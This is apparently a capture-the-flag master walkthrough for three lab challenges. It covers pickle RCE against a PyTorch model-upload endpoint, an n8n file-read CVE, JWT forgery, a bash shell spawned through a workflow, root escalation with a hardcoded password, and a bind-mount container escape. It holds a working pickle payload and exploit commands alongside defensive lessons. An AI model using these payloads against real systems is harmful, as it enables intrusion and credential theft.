# 🪐 Cypheron — Master Walkthrough

**Event:** 2026: An AI Odyssey
**Planet:** Cypheron (`04-Cypheron`)
**Theme:** AI supply-chain compromise → workflow-automation pivot → container escape.

This is the **planet-level master**. It indexes every sub-section, summarises each kill chain,
collects every flag in one place, and stitches the narrative together. Each sub-section has its
own detailed `WALKTHROUGH.md` if you want the full step-by-step.

---

## Sub-Section Index

| # | Sub-section | Vector | Difficulty | Detail |
|---|-------------|--------|------------|--------|
| 01 | `01-TrojanedModel_NeuralC2Beacon` | Unsafe `torch.load` (pickle RCE) on remote service | Insane (120 pts) | [WALKTHROUGH.md](01-TrojanedModel_NeuralC2Beacon/WALKTHROUGH.md) |
| 02 | `02-TrojanedModel_NeuralC2Beacon_DownloadableFile` | Static analysis of supplied `.pt` artifact | Easy (standalone) | [WALKTHROUGH.md](02-TrojanedModel_NeuralC2Beacon_DownloadableFile/WALKTHROUGH.md) |
| 03 | `03-Nightmare` | n8n LFI → JWT forgery → workflow RCE → container escape | Insane | [WALKTHROUGH.md](03-Nightmare/WALKTHROUGH.md) |

> Sections 01 and 02 are two halves of the same challenge. Section 02 is the "no-server"
> shortcut to the first flag — you can solve it with nothing but `unzip`. Section 01 is the full
> three-flag chain that also yields the trigger and operator-prize flags via RCE on the
> inference service.

---

## All Flags

| # | Flag | Planet sub-section | Source |
|---|------|--------------------|--------|
| 1 | `THM{artifact_suspicious}` | 01 / 02 | `_calibration_constants` byte buffer inside `signal_classifier.pt`. |
| 2 | `THM{trigger_identified}` | 01 | `/etc/c2-hint.txt` on the inference container, readable after pickle RCE. |
| 3 | `THM{neural_c2_compromise}` | 01 | `/flag` on the inference container, world-readable post-RCE. |
| 4 | `THM{nightmare_just_begun}` | 03 | `/home/node/flag-user-lfi.txt` via n8n CVE-2026-21858 unauthenticated LFI. |
| 5 | `THM{p4g3_c4ch3_g0t_wr1tt3n_k3rn3l_pwn3d_c0nt41n3r_3sc4p3d}` | 03 | `/host-root/flag.txt` after PrivEsc to root and Docker host-bind escape. |

**Total: 5 flags across 2 boxes.**

---

## Planet Narrative

Cypheron is the **supply-chain compromise** planet. Both challenges share a thesis: *modern AI
deployments daisy-chain trusted tools that were never designed to be a security boundary —
serialization libraries, low-code automation platforms, container bind-mounts — and an attacker
who understands those tools' load-time behaviour gets to walk straight through them.*

* **Trojaned Model** weaponises the fact that `torch.load(weights_only=False)` is built on
  pickle, which means deserialising an attacker-supplied `.pt` is `exec()`. The model itself is
  also a covert data channel — 24 ASCII bytes pretending to be "calibration constants" ship
  inside every artifact.
* **Nightmare** is the post-AI half: an n8n workflow-automation server (the kind of platform
  teams use to *deploy* the kind of model from challenge 01) has an unauth file-read CVE in its
  Form Trigger, which seeds JWT forgery, then authenticated workflow RCE, then a host bind-mount
  escape.

The two together model a realistic 2026 incident: a poisoned model gets pushed through a
low-code MLOps pipeline that was never hardened against the model itself.

---

## 01 · Trojaned Model — Neural C2 Beacon (Insane · 120 pts)

**Target:** `10.67.188.40:8000` (Gunicorn / Flask)
**Flags:** `THM{artifact_suspicious}`, `THM{trigger_identified}`, `THM{neural_c2_compromise}`

### Kill chain

1. **Recon.** Service banner advertises two endpoints — `POST /classify` for inference and
   `POST /vendor/push` for vendor model updates. The banner literally documents that
   `/vendor/push` calls `torch.load(weights_only=False)` "for backwards compatibility".
2. **Pickle RCE.** Craft a `.pt` whose pickle reduces to `(exec, (code,))`. Trigger via the
   vendor-push endpoint.
3. **Exception-as-exfil.** The Flask handler wraps the loader call in
   `try/except` and reflects the exception's string representation into the JSON response.
   Raising `Exception(stdout + stderr)` from inside the pickle turns the error channel into a
   command-output channel.
4. **Flag 3 — `/flag`.** World-readable. `cat /flag` → `THM{neural_c2_compromise}`.
5. **Flag 2 — `/etc/c2-hint.txt`.** "Proof of execution" marker the operator drops once their
   payload runs → `THM{trigger_identified}`.
6. **Flag 1 — model buffer.** Exfiltrate `/app/model/signal_classifier.pt` (base64 over the
   exception channel), then locally read the `_calibration_constants` byte buffer:
   `THM{artifact_suspicious}`.

### Minimal payload

```python
import pickle, requests
class RCE:
    def __reduce__(self):
        code = (
          "import subprocess\n"
          "o=subprocess.run('cat /flag', shell=True, capture_output=True)\n"
          "raise Exception('X::'+o.stdout.decode()+'::X')"
        )
        return (exec, (code,))
r = requests.post("http://10.67.188.40:8000/vendor/push",
                  files={"artifact": ("x.pt", pickle.dumps(RCE()))})
print(r.json())
```

### Lessons

* `torch.load(..., weights_only=False)` on untrusted input is RCE. PyTorch 2.4+ defaults to
  `True` for exactly this reason.
* Never reflect raw exception strings into HTTP responses — turns the error path into an
  exfiltration channel.
* Tensor buffers ship with the model. Don't put secrets in them; don't trust them either.

Full detail: [01-TrojanedModel_NeuralC2Beacon/WALKTHROUGH.md](01-TrojanedModel_NeuralC2Beacon/WALKTHROUGH.md)

---

## 02 · Trojaned Model — Downloadable Artifact (static analysis)

**Artifact:** `signal-classifier-1778659286018.pt`
**Flag:** `THM{artifact_suspicious}`

The same flag as Q1 of section 01, but reachable with no network at all — useful as a warm-up or
when the live target is down.

### Kill chain

1. `file` the `.pt` → it's a ZIP.
2. `unzip -l` shows seven tensor storages. Six match the layer dimensions of a tidy little MLP
   (`Linear(16→64)` + `Linear(64→32)` + `Linear(32→2)`); the seventh is 24 bytes — exactly the
   length of a `THM{…}` flag.
3. `unzip -p signal_classifier/data/0` prints `THM{artifact_suspicious}`. Done.

```bash
$ unzip -p signal-classifier-1778659286018.pt signal_classifier/data/0
THM{artifact_suspicious}
```

A `pickletools.dis` of `data.pkl` confirms `data/0` is bound to a tensor buffer named
`_calibration_constants`, dtype `uint8`, length 24 — there is no legitimate reason for an MLP
of this size to ship a 24-byte "calibration" buffer.

Full detail: [02-TrojanedModel_NeuralC2Beacon_DownloadableFile/WALKTHROUGH.md](02-TrojanedModel_NeuralC2Beacon_DownloadableFile/WALKTHROUGH.md)

---

## 03 · Nightmare (Insane)

**Target:** `10.67.145.144` (SSH:22, n8n:5678)
**Flags:** `THM{nightmare_just_begun}`, `THM{p4g3_c4ch3_g0t_wr1tt3n_k3rn3l_pwn3d_c0nt41n3r_3sc4p3d}`

### Kill chain at a glance

```
CVE-2026-21858 (n8n Form Trigger JSON LFI)
  → /proc/self/environ  (N8N_JWT_SECRET + N8N_ENCRYPTION_KEY)
  → /home/node/.n8n/database.sqlite (secret workflow, user bcrypt hashes)
  → /home/node/flag-user-lfi.txt    [user flag]
  → JWT forgery (sha256("email:bcrypt")[:10] hash field, HS256 with leaked secret)
  → PATCH workflow → Execute Command node → Node.js PTY shell as `node`
  → /setup.sh leaks hardcoded root password
  → su root
  → /host-root/flag.txt             [root flag — container escape]
```

### Step highlights

* **The CVE.** n8n's Form Trigger normally consumes `multipart/form-data` and fills in the file
  metadata server-side. v1.120.4 *also* accepts `application/json` and trusts every field —
  including `filepath` — straight from the user. Submit a JSON body that claims your file lives
  at `/etc/passwd`, get `/etc/passwd` back. No auth.

  ```bash
  curl -s -X POST http://10.67.145.144:5678/form/file-processor \
    -H 'Content-Type: application/json' \
    -d '{"files":{"f":{"filepath":"/etc/passwd","originalFilename":"x","mimetype":"text/plain","size":1}}}'
  ```

* **JWT secret loot.** `/proc/self/environ` ships `N8N_JWT_SECRET` and `N8N_ENCRYPTION_KEY` as
  env vars set by the systemd unit. LFI both.

* **DB pillage.** Exfil `database.sqlite`, dump `user_entity` (email + bcrypt) and
  `workflow_entity` (a hidden "Internal Automation" workflow whose webhook path
  `secret-webhook` is hardcoded `id`).

* **Initial RCE.** Hit `POST /webhook/secret-webhook` — runs the hardcoded `id`, returns the
  output. Foothold without auth, but command is fixed.

* **JWT forge.** n8n's `createJWTHash()` is
  `sha256(email + ":" + bcrypt_hash).digest('base64')[:10]`. Compute it from leaked values,
  sign an `{id, email, hash}` payload with the leaked HS256 secret, set the `n8n-auth` cookie,
  hit `/rest/workflows` as admin.

* **Workflow rewrite → interactive shell.** PATCH the Execute Command node's `command` to
  `node -e "require('child_process').spawn('/bin/bash',['-i'],{stdio:'inherit'})"`. Retrigger
  the webhook → PTY as `node`.

* **PrivEsc.** Read `/setup.sh` (via LFI or shell). Hardcoded:
  `N1ghtm4r3R00t!CTF2026`. `su root`.

* **Escape.** `/host-root/` is a bind-mount of the host root filesystem.
  `cat /host-root/flag.txt` → root flag.

### Lessons

* Form parsers must never share trust between transport formats. Multipart populates `filepath`
  server-side; JSON should not be allowed to override it.
* `/proc/self/environ` is the single best file to read with an LFI on a long-running daemon.
* Reading the actual source of the target product (n8n v1.120.4's `auth.service.ts`) is what
  unlocked the JWT forge — the 10-character `.substring(0,10)` is invisible from outside.
* Docker bind-mounts are not a security boundary. `/host-root/` makes the "container escape"
  step `cat`.

Full detail: [03-Nightmare/WALKTHROUGH.md](03-Nightmare/WALKTHROUGH.md)

---

## Cross-Cutting Defensive Notes

| Theme | What broke | What should have happened |
|-------|-----------|---------------------------|
| Deserialisation | `torch.load(..., weights_only=False)` on untrusted upload | `weights_only=True`, or `safetensors`, or signed-manifest pull from a known vendor key |
| Information disclosure via errors | Exception string reflected into JSON response | Log server-side, return generic `{"error": "validation failed"}` |
| Secrets at rest | Plaintext secrets in `/proc/self/environ` accessible via LFI | Read at boot, drop privs, scrub env; use a secrets daemon |
| AuthN tokens | JWT secret hardcoded + truncated 10-char hash field | Long random secret outside the image, full-length integrity field, asymmetric signing |
| Privilege model | Hardcoded root password in `/setup.sh` left on disk | One-shot password, removed by `cloud-init` final step |
| Container boundary | `/host-root/` bind-mount of host `/` | No host-fs bind-mounts; if needed, mount specific paths read-only |
| ML supply chain | Vendor pushes binary blobs over HTTP, no signature, parsed via pickle | Cosign/Sigstore-signed manifests, content-addressed storage, `weights_only` loader |

---

## Tool / Skill Set Used

* HTTP enumeration: `nmap`, `curl`, browser dev tools.
* Python tooling: `pickle`, `pickletools`, `requests`, `PyJWT`, `sqlite3`, `base64`.
* PyTorch internals: `.pt` → ZIP layout, `state_dict`, `register_buffer`.
* JWT forensics: HS256 forging with a leaked secret and a custom payload.
* Source archaeology: reading the *target product*'s own GitHub source to find the truncation
  in `createJWTHash`.
* Container post-ex: spotting `/host-root/` and reading host files directly.

---

## Suggested Solve Order

1. **02** (downloadable artifact) — get `THM{artifact_suspicious}` in 30 seconds with `unzip`,
   confirm you understand `.pt` internals.
2. **01** (Neural C2 Beacon) — full pickle RCE chain, picks up the remaining two trojaned-model
   flags.
3. **03** (Nightmare) — multi-stage box, JWT forge + container escape; significantly longer.

---

## Sub-Section Files

```
04-Cypheron/
├── WALKTHROUGH.md                                            # this file
├── 01-TrojanedModel_NeuralC2Beacon/
│   ├── WALKTHROUGH.md                                        # full Q1–Q3 walkthrough
│   ├── TrojanedModel_NeuralBeacon.nmap                       # reference nmap output
│   └── TrojanedModel_NeuralBeacon.png                        # challenge briefing image
├── 02-TrojanedModel_NeuralC2Beacon_DownloadableFile/
│   ├── WALKTHROUGH.md                                        # static .pt analysis
│   └── signal-classifier-1778659286018.pt                    # provided artifact
└── 03-Nightmare/
    ├── WALKTHROUGH.md                                        # Nightmare full chain
    ├── nightmare.nmap                                        # reference nmap output
    └── Nightmare.png                                         # challenge briefing image
```

---

*Master walkthrough for planet Cypheron — 2026: An AI Odyssey.*
